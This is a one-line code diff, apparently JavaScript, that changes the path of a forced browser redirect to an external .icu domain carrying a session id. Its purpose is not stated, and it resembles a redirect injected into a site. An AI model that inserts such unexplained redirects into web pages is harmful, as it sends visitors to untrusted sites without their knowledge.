@@ -1,1 +1,1 @@
-window.location.href = "https://rickeys.icu/Uhi/go?sid=7744";
+window.location.href = "https://rickeys.icu/ysdut/go?sid=7744";
